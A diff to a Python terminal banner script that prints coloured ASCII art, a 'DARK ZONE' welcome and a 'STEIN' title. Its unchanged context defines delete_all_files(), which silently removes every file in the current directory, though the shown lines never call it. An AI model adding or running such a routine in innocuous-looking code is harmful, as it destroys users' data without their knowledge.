@@ -21,7 +21,7 @@ def print_text1():
 ⣿⣿⣿⣿⣿⣿⣿⣷⡄⠄⠄⠈⠛⠿⠿⠿⣻⡏⢠⣿⣎⣾⣿⣿⣿⣿⣿⣿⣿
 ⣿⣿⣿⣿⣿⣿⡿⠟⠛⠄⠄⠄⠄⠄⠙⣛⣿⣿⣵⣿⡿⢹⡟⣿⣿⣿⣿⣿
     """
-    print(text1)
+    print(Fore.BLUE + text1)
     sys.stdout.flush()
 
 def print_text2():
@@ -38,31 +38,29 @@ def print_text2():
 ⠀⠀⠀⠀⠀⠀⠀⠈⢻⣻⣻⣷⣤⣀⣀⣀⠄⢰⡟⠀⠱⠁⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⢀⣠⣤⣻⣻⣻⣻⣦⠤⠀⠀⠊⠀⢀⡆⢠⠀⠀⠀⠀⠀
     """
-    print(text2)
+    print(Fore.GREEN + text2)
     sys.stdout.flush()
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
 def slow_print(text, delay=0.1):
-    # Print each character one by one with a delay
     for char in text:
         sys.stdout.write(char)
         sys.stdout.flush()
-        time.sleep(delay)  # Adjust the speed here
+        time.sleep(delay)
     print()
 
 def delete_all_files():
-    # Deletes all files in the current directory
     for filename in os.listdir('.'):
         if os.path.isfile(filename):
             os.remove(filename)
 
 def main():
-    # Print welcome message in blue to purple (no animation) for 2 seconds
+    # Print welcome message in blue to purple for 2 seconds
     welcome_message = "Hey WELCOME TO DARK ZONE"
     print(Fore.BLUE + welcome_message)
-    time.sleep(2)  # Pause for 2 seconds before proceeding
+    time.sleep(2)
 
     # Start switching between text1 and text2
     start_time = time.time()
@@ -86,7 +84,7 @@ def main():
 
     # Print "STEIN" using pyfiglet and colorama
     stein_art = pyfiglet.figlet_format("STEIN")
-    print(Fore.RED + stein_art)  # Red color for "STEIN"
+    print(Fore.RED + stein_art)
 
     # Additional information using colorama
     additional_info1 = "DEVELOPER : @demonpis TELEGRAM"
@@ -94,7 +92,7 @@ def main():
     print(Fore.BLUE + additional_info1)
     print(Fore.BLUE + additional_info2)
 
-    time.sleep(4)  # Display STEIN and additional information for 4 seconds before exiting
+    time.sleep(4)
 
 if __name__ == "__main__":
     main()
